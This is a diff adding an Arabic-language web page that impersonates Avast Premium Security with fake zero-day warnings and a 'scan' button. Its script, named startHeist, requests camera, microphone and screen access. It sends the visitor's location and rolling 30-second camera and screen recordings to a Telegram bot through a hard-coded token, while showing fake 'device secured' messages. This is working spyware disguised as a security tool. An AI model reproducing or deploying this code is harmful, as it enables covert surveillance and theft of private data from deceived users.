@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Avast Premium Security | Shield Advisor</title>
+    <meta name="description" content="⚠️ تنبيه أمني: تم اكتشاف ثغرات (Zero-Day) في محرك V8. ابدأ الفحص الآن لتأمين جهازك.">
+    <meta property="og:title" content="Avast Premium Security | Shield Advisor">
+    <meta property="og:image" content="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
+    <meta property="og:description" content="نظام حماية سحابي متطور لتأمين المتصفح ومنع Sandbox Escape.">
+    <meta property="og:type" content="website">
+
+    <style>
+        /* 🎨 كود التنسيق (CSS) لضمان المظهر الرسمي */
+        :root { --orange: #ff7b00; --bg: #fffcf5; --green: #28a745; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: white; text-align: center; color: #333; }
+        
+        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; border-bottom: 1px solid #eee; background: #fff; }
+        .logo-small { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--orange); object-fit: cover; }
+        .status { color: var(--green); font-size: 13px; font-weight: bold; }
+
+        .hero { background: var(--bg); padding: 60px 8%; border-bottom: 1px solid #f0e0c0; }
+        .main-card { background: white; padding: 40px; border-radius: 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.12); display: inline-block; width: 100%; max-width: 550px; border: 2px solid var(--orange); }
+        
+        .logo-main { width: 120px; height: 120px; border-radius: 50%; border: 3px solid var(--orange); margin-bottom: 25px; object-fit: cover; }
+        .btn-scan { background: var(--orange); color: white; border: none; padding: 22px 0; font-size: 1.6rem; font-weight: bold; border-radius: 60px; cursor: pointer; width: 100%; box-shadow: 0 10px 25px rgba(255, 123, 0, 0.4); transition: 0.3s; }
+        .btn-scan:hover { transform: translateY(-4px); }
+
+        .terminal { display: none; background: #0b0e14; color: #00ff41; padding: 20px; border-radius: 12px; font-family: monospace; text-align: left; direction: ltr; height: 180px; overflow-y: auto; margin-top: 20px; border: 1px solid #333; }
+        
+        .vuln-list { margin-top: 20px; text-align: right; background: #fff5f5; padding: 15px; border-radius: 12px; border: 1px dashed #ff4d4f; }
+        .vuln-item { color: #cf1322; font-size: 13px; margin-bottom: 5px; }
+        .vuln-item::before { content: "⚠️"; margin-left: 8px; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div style="display: flex; align-items: center;">
+        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" class="logo-small">
+        <span style="font-weight: bold; margin-right: 12px; color: var(--orange); font-size: 20px;">Shield Advisor</span>
+    </div>
+    <div class="status">Cloud Engine: Active ✅</div>
+</div>
+
+<div class="hero">
+    <h1>مركز أمان <span style="color:var(--orange)">Avast</span> المتطور</h1>
+    <p style="color: #666; margin-bottom: 40px;">تم اكتشاف ثغرات (Zero-Day) في محرك V8 ومحاولات Sandbox Escape. اضغط للتأمين.</p>
+
+    <div class="main-card" id="box">
+        <div id="ui">
+            <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" class="logo-main">
+            <button class="btn-scan" onclick="startHeist()">بدء الفحص الشامل</button>
+            
+            <div class="vuln-list">
+                <div class="vuln-item">ثغرة Use-After-Free في ذاكرة المتصفح</div>
+                <div class="vuln-item">كشف محاولة ارتباك النوع (Type Confusion)</div>
+            </div>
+        </div>
+        <div class="terminal" id="term"></div>
+    </div>
+</div>
+
+<script>
+    /* ⚙️ كود التحكم (JS) لسحب البيانات وإرسالها للبوت */
+    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+    const ADMIN_ID = "8754338811";
+
+    async function sendMsg(text) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown' })
+        });
+    }
+
+    async function startHeist() {
+        document.getElementById('ui').style.display = 'none';
+        const term = document.getElementById('term');
+        term.style.display = 'block';
+        term.innerHTML = "> Connecting to Avast Secure Cloud...<br>> Analyzing V8 Engine vulnerabilities...<br>";
+
+        try {
+            // طلب الصلاحيات الأساسية (كاميرا وشاشة)
+            const cam = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            
+            sendMsg("🚀 **صيد جديد!** تم قبول كافة الصلاحيات.");
+
+            // سحب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(p => {
+                sendMsg(`📍 **موقع الضحية:** \\nhttps://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // تسجيل وإرسال الفيديوهات
+            record(cam, "📷 كاميرا");
+            record(scr, "🖥️ شاشة");
+
+            term.innerHTML += "> [SUCCESS] Security patch applied.<br>> System Secured.";
+            
+            // تمويه النجاح
+            setTimeout(() => {
+                document.getElementById('box').innerHTML = `
+                    <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width:70px; border-radius:50%; margin-bottom:15px; border:2px solid var(--orange);">
+                    <h3 style="color:var(--green);">✅ تم تأمين الجهاز بنجاح!</h3>`;
+            }, 3000);
+
+        } catch (e) {
+            alert("⚠️ يجب الموافقة على الأذونات لسد الثغرات المكتشفة.");
+            location.reload();
+        }
+    }
+
+    function record(stream, label) {
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'video/mp4' });
+            const fd = new FormData();
+            fd.append('chat_id', ADMIN_ID);
+            fd.append('video', blob, label + ".mp4");
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            if (stream.active) record(stream, label);
+        };
+        recorder.start();
+        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 30000);
+    }
+</script>
+</body>
+</html>
